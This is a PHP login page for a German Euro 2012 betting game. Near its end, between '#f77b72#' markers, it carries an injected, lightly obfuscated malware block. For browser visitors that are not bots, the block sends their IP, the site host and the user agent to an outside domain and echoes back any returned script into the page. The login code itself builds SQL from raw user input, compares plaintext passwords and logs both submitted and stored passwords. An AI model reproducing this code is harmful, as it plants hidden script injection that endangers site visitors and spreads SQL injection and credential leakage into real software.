<?php 
$userId=$_GET["userId"];
include_once("../../general/log/log.php5");
include_once("../../general/log/logsitecall.php5");
include_once("../../connection/dbaccess.php5");
include_once("../util/dbschema.php5");
if(!isset($_POST["login"]))
{
	promptLogin("");
}
else if(empty($_POST["username"]))
{
	echo "<br>Username fehlt. Bitte Eingabe korrigieren.";
	promptLogin("");
}
else if(empty($_POST["password"]))
{
	echo "<br>Passwort fehlt. Bitte Eingabe korrigieren.";
	promptLogin($_POST["username"]);
}
else
{
	$username=$_POST["username"];
	$table_users=dbschema::users;
	// Passwort aus der DB holen
	$sql1="SELECT * FROM $table_users WHERE username='$username'";
	$result=mysql_query($sql1);
	if(!$result)
	{
		echo "<br>SQL Query : $sql1";
		$err = mysql_error();
		echo "<br>SQL ERROR : $err";
		exit;
	}
	else
	{
		$array1=mysql_fetch_array($result);
		$password=$array1["password"];
		$userId=$array1["userid"];
		
		// Passwort �berpr�fen
		if($_POST["password"] != $password)
		{
			echo "<br>Falsches Passwort. Bitte Eingabe korrigieren.";
			$postPW=$_POST["password"];
			$mylog = new logger;
			$mylog->error("Post-Passwort=$postPW, DB-Passwort=$password");
			$mylog->error("SQL-Query: $sql1");
			promptLogin($username);
		}
		else if ($username==="admin")
		{
			header("Location: ../admin/overviewAdmin.php5?userId=$userId");
		}
		else
		{
			header("Location: ../user-before/FramedLogin.php5?userId=$userId");
			//header("Location: ../user-before/overview.php5?userId=$userId");
		}
	}
	
	//Datenbankconnection schlie�en
	mysql_close();
}

function promptLogin($username){
	?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//DE"
            "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<link rel='stylesheet' type='text/css' href='../../style/style.css' />
<title>EM-Tipp Login </title>
</head>
<body>
<center>
<p><img src="../pics/EM-Logo-2012 (Klein).png" alt="EM2012-Logo"></p>

<?php 
	echo "<table>";
	echo "<form method='POST' action='loginBefore.php5'>";
	echo "<tr>";
	echo "<td>User-Name:</td><td>	<input type='text' size='50' name='username' value='$username'></td>";
	echo "</tr>";
	echo "<tr>";
	echo "<td>Passwort :</td><td>	<input type='password' size='50' name='password' value=''></td>";
	echo "</tr>";
	echo "<tr>";
	echo "<td></td><td><input type='submit' name='login' value='Einloggen'></td>";
	echo "</tr>";
	echo "</table>";
	}
?>
<?php
#f77b72#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/f77b72#
?>
<br>
<br>
<a href='../docs/Spielregeln_EM.pdf'>EM-Tipp-Regeln</a>
<br>
<!--
<a href='../anybody/showUserRank.php5'>Punktestand</a>
-->
</center>

</body>
</html>